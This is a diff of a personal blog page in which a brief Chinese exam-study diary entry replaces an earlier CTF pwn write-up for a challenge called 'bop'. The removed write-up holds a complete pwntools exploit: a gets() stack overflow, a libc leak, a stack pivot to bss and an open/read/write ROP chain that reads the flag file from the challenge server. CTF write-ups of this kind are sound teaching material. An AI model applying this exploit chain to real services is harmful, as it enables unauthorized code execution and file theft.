@@ -16,21 +16,24 @@
   <meta name="author" content="nqoinaen">
   <meta name="keywords" content="">
   
-    <meta name="description" content="路">
+    <meta name="description" content="🤔🤔🤔">
 <meta property="og:type" content="article">
-<meta property="og:title" content="bop">
-<meta property="og:url" content="https://nqoinaen.github.io/2023/02/05/bop/index.html">
+<meta property="og:title" content="随便记记">
+<meta property="og:url" content="https://nqoinaen.github.io/2023/04/30/%E8%80%83%E7%A0%94%E8%AE%B0%E5%BD%95/index.html">
 <meta property="og:site_name" content="nqoinaen&#39;s blog">
-<meta property="og:description" content="路">
+<meta property="og:description" content="🤔🤔🤔">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2023-02-04T16:00:00.000Z">
-<meta property="article:modified_time" content="2023-02-19T10:54:11.622Z">
+<meta property="og:image" content="https://nqoinaen.github.io/2023/04/30/%E8%80%83%E7%A0%94%E8%AE%B0%E5%BD%95/430.png">
+<meta property="article:published_time" content="2023-04-30T15:00:00.000Z">
+<meta property="article:modified_time" content="2023-04-30T14:45:34.255Z">
 <meta property="article:author" content="nqoinaen">
+<meta property="article:tag" content="？？？">
 <meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://nqoinaen.github.io/2023/04/30/%E8%80%83%E7%A0%94%E8%AE%B0%E5%BD%95/430.png">
   
   
   
-  <title>bop - nqoinaen&#39;s blog</title>
+  <title>随便记记 - nqoinaen&#39;s blog</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -207,7 +210,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="bop"></span>
+            <span id="subtitle" data-typed-text="随便记记"></span>
           
         </div>
 
@@ -223,8 +226,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2023-02-05 00:00" pubdate>
-          2023年2月5日 凌晨
+        <time datetime="2023-04-30 23:00" pubdate>
+          2023年4月30日 晚上
         </time>
       </span>
     
@@ -235,7 +238,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          2.3k 字
+          113 字
         
       </span>
     
@@ -246,7 +249,7 @@
         
         
         
-          5 分钟
+          1 分钟
         
       </span>
     
@@ -284,12 +287,12 @@
         <div id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">bop</h1>
+            <h1 style="display: none">随便记记</h1>
             
               <p class="note note-info">
                 
                   
-                    本文最后更新于：2023年2月19日 晚上
+                    本文最后更新于：2023年4月30日 晚上
                   
                 
               </p>
@@ -297,11 +300,14 @@
             
               <div class="markdown-body">
                 
-                <h2 id="前言">前言</h2>
-<h2 id="bop">bop</h2>
-<p>找libc是2.31的，看dockerfile得知<code>.flag.txt</code></p>
-<p>gets无限制栈溢出，泄露libc，栈迁移至bss执行orw,open要用syscall的</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> * <br><span class="hljs-comment">#from LibcSearcher import *</span><br>local_file  = <span class="hljs-string">&#x27;./bop&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span><br>select = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">elif</span> select == <span class="hljs-number">1</span>:<br>    r = remote(<span class="hljs-string">&#x27;mc.ax&#x27;</span>,<span class="hljs-number">30284</span> )<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims 			:r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">b&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br><span class="hljs-comment">#------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br>     pause()<br>pop_rdi=<span class="hljs-number">0x00000000004013d3</span><br>main=<span class="hljs-number">0x4012f9</span><br>gets=<span class="hljs-number">0x401352</span><br>ret=<span class="hljs-number">0x000000000040101a</span><br>bss=<span class="hljs-number">0x404080</span>+<span class="hljs-number">0x200</span><br>leave_ret=<span class="hljs-number">0x00000000004012f7</span><br><span class="hljs-comment">#debug()</span><br>pd=flat(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>,bss,ret,pop_rdi,elf.got[<span class="hljs-string">&#x27;printf&#x27;</span>],elf.sym[<span class="hljs-string">&#x27;printf&#x27;</span>],pop_rdi,<span class="hljs-number">0</span>,gets)<br>pd=pd.ljust(<span class="hljs-number">0xe0</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>sla(<span class="hljs-string">&#x27;Do you bop? &#x27;</span>,pd)<br>libc_base=uu64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:])-libc.sym[<span class="hljs-string">&#x27;printf&#x27;</span>]<br>info(<span class="hljs-string">&#x27;libc_base&#x27;</span>,libc_base)<br><br><span class="hljs-comment">#libc=LibcSearcher(&quot;printf&quot;,libc_base)</span><br><span class="hljs-comment">#len(libc)</span><br><br><span class="hljs-comment">#libc_base = libc_base-libc.dump(&quot;printf&quot;)</span><br><span class="hljs-comment">#system = libc_base+libc.dump(&quot;system&quot;)            </span><br><span class="hljs-comment">#binsh = libc_base+libc.dump(&quot;str_bin_sh&quot;) </span><br><br><span class="hljs-comment">#info(&#x27;libc_base&#x27;,libc_base)</span><br><br>pop_rsi = libc_base + <span class="hljs-built_in">next</span>(libc.search(asm(<span class="hljs-string">&#x27;pop rsi\nret&#x27;</span>)))<br>pop_rdx = libc_base + <span class="hljs-number">0x142c92</span><br>pop_rax = libc_base + <span class="hljs-built_in">next</span>(libc.search(asm(<span class="hljs-string">&#x27;pop rax\nret&#x27;</span>)))<br>syscall = libc_base + <span class="hljs-built_in">next</span>(libc.search(asm(<span class="hljs-string">&#x27;syscall\nret&#x27;</span>)))<br>pd=<span class="hljs-string">b&quot;./flag.txt\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;</span><br>pd+=flat(ret,ret,ret,ret,pop_rdi,bss-<span class="hljs-number">0x20</span>,pop_rsi,<span class="hljs-number">0</span>,pop_rax,<span class="hljs-number">2</span>,syscall)<br>pd+=flat(pop_rdi,<span class="hljs-number">3</span>,pop_rsi,bss-<span class="hljs-number">0x140</span>,pop_rdx,<span class="hljs-number">0x40</span>,libc_base+libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>])<br>pd+=flat(pop_rdi,<span class="hljs-number">1</span>,pop_rsi,bss-<span class="hljs-number">0x140</span>,pop_rdx,<span class="hljs-number">0x40</span>,libc_base+libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>])<br><span class="hljs-comment">#debug()</span><br>sl(pd)<br><br>r.interactive()<br></code></pre></td></tr></table></figure>
+                <h2 id="前言：">前言：</h2>
+<p>记录一下每日所学，收获些许成就感</p>
+<h2 id="2023-4">2023.4</h2>
+<h3 id="4-30">4.30</h3>
+<p><strong>英语：</strong> 新学97个单词</p>
+<p><strong>专业课：</strong> 学习了数据结构第四章《串》，学会手算<code>next[j]</code>,<code>nextval[j]</code>，第五章《树》关于一些树的基本概念和性质</p>
+<p><strong>数学：</strong> 二刷了概率第三讲的例题</p>
+<p><img src="/2023/04/30/%E8%80%83%E7%A0%94%E8%AE%B0%E5%BD%95/430.png" srcset="/img/loading.gif" lazyload alt="430"></p>
 
                 
               </div>
@@ -310,6 +316,34 @@
             <div>
               <div class="post-metas my-3">
   
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E6%97%A5%E8%AE%B0/" class="category-chain-item">日记</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%EF%BC%9F%EF%BC%9F%EF%BC%9F/">#？？？</a>
+      
+    </div>
   
 </div>
 
@@ -319,8 +353,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>bop</div>
-      <div>https://nqoinaen.github.io/2023/02/05/bop/</div>
+      <div>随便记记</div>
+      <div>https://nqoinaen.github.io/2023/04/30/考研记录/</div>
     </div>
     <div class="license-meta">
       
@@ -332,13 +366,13 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2023年2月5日</div>
+          <div>2023年4月30日</div>
         </div>
       
       
         <div class="license-meta-item license-meta-date">
           <div>更新于</div>
-          <div>2023年2月19日</div>
+          <div>2023年4月30日</div>
         </div>
       
       
@@ -369,18 +403,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2023/04/30/%E8%80%83%E7%A0%94%E8%AE%B0%E5%BD%95/" title="随便记记">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">随便记记</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2023/02/02/2022%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E9%83%A8%E5%88%86pwn/" title="2022西湖论剑线上赛pwn">
-                        <span class="hidden-mobile">2022西湖论剑线上赛pwn</span>
+                      <a href="/2023/02/05/bop/" title="bop">
+                        <span class="hidden-mobile">bop</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
